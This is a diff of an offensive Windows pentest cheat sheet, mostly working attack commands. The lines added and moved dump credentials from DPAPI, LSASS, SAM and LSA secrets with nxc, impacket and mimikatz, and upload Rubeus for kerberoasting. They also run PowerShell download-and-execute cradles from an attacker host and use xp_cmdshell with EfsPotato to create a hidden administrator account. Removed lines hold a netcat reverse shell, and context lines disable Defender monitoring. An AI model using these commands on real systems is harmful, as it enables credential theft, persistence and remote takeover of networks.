@@ -90,6 +90,43 @@ sort -nu -t . -k1,1 -k2,2 -k3,3 -k4,4 tmp.hosts | tee hosts_
 sudo nmap -n -Pn -sS -iL hosts_ --open --max-rate 50 -oA 'TCP_$TARGET__24'
 sudo nmap -n -Pn -sS '$TARGET/24' --excludefile hosts_ -F --open --max-rate 50 -oA 'TCP_ALL_$TARGET__24'
 
+# dbf: Account Created
+## Automated Dump: DPAPI, LSASS, SAM + Secrets
+(t=$TARGET; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump 'dbf:123qweasdF!'@$t) | tee dump_$t
+
+## Upload Binaries
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
+nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
+
+## Winrm: Command Execution
+evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
+
+## DPAPI: SIDs, CREDENTIALS + MASTERKEYS
+mkdir dpapi
+winexe -U 'dbf%123qweasdF!' //$TARGET "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')\"" | tee dpapi_$TARGET
+evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
+download ...\S-1-5...\7dc6a492-36e2-4c2d-be66-ba29d263dda2 dpapi/
+download ...\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 dpapi/
+impacket-dpapi masterkey -file dpapi/7dc6a492-36e2-4c2d-be66-ba29d263dda2 -sid S-1-5... -password OF_DPAPI_USER | grep 'Decrypted key:'
+impacket-dpapi credential -file dpapi/936A68B5AC87C545C4A22D1AF264C8E9 -key 0xdcd70638e50e...
+
+## Rubeus: Tickets
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
+winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap'
+
+## Mimikatz: Dumps+
+rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
+privilege::debug
+token::elevate
+sekurlsa::logonpasswords
+lsadump::secrets
+vault::list
+vault::cred /patch
+sekurlsa::dpapi
+
+
 # Tech and Protocols
 ## Web
 [*] Web Shell
@@ -913,11 +950,11 @@ sp_serveroption 'SQL02', 'rpc out', 'true'
 use_link "SQL02"
 use_link ..
 enable_xp_cmdshell
-upload /Upload/windows/EfsPotato.exe C:\ProgramData\EfsPotato.exe
-upload /Upload/windows/nc.exe C:\ProgramData\nc.exe
-xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c \"whoami; arp -a; hostname\""
-xp_cmdshell c:\programdata\EfsPotato.exe "powershell -c C:\programdata\nc.exe $MYIP 80 -e cmd"
-xp_cmdshell powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://$MYIP/resh.ps1\"); resh -Reverse $MYIP -Port 80"
+upload /Upload/windows/EfsPotato.exe C:\Windows\Tasks\EfsPotato.exe
+xp_cmdshell C:\Windows\Tasks\EfsPotato.exe "powershell -c \"Invoke-Command -ScriptBlock { whoami /priv; arp /a; ipconfig /all }\""
+xp_cmdshell C:\Windows\Tasks\EfsPotato.exe "powershell -c \"Invoke-Command -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }\""
+SELECT table_name,table_schema from [databasename].INFORMATION_SCHEMA.TABLES;
+SELECT * FROM [databasename].[dbo].[tablename];
 
 +---------- Get Hash ----------+
 sudo responder -I tun0 -v
@@ -1538,25 +1575,6 @@ impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /
 $computer='WS02'; $pass='YwBxQ1hv'; Set-Item WSMan:\localhost\Client\TrustedHosts -Value $computer -Force -Confirm:$false; $sec=ConvertTo-SecureString $pass -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential("$computer\Administrator",$sec); Invoke-Command -ComputerName $computer -Credential $cred -Authentication Negotiate -ScriptBlock { whoami /priv; arp /a; ipconfig /all }
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { New-SmbShare -Name tasks -Path "C:\Windows\Tasks" -FullAccess dbf; Add-MpPreference -ExclusionPath "C:\Windows\Tasks"; Set-MpPreference -DisableRealtimeMonitoring $true }
-
-+---------- dbf: Account Created ----------+
-(t=$TARGET; echo '\033[33m--------------[ DPAPI ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' --dpapi --local-auth; echo '\033[33m--------------[ LSASS ]--------------\033[0m';nxc smb $t -u dbf -p '123qweasdF!' -M lsassy --local-auth; echo '\033[33m--------------[ SAM + SECRETS ]--------------\033[0m'; impacket-secretsdump 'dbf:123qweasdF!'@$t) | tee dump_$t
-nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
-nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
-evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
-winexe -U 'dbf%123qweasdF!' //$TARGET "C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')\"" | tee dpapi_$TARGET
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe dump /nowrap'
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe tgtdeleg /nowrap'
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe asreproast /nowrap'
-winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\Rubeus.exe kerberoast /nowrap'
-rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
-privilege::debug
-token::elevate
-sekurlsa::logonpasswords
-lsadump::secrets
-vault::list
-vault::cred /patch
-sekurlsa::dpapi
 
 +---------- DPAPI ----------+
 mkdir dpapi
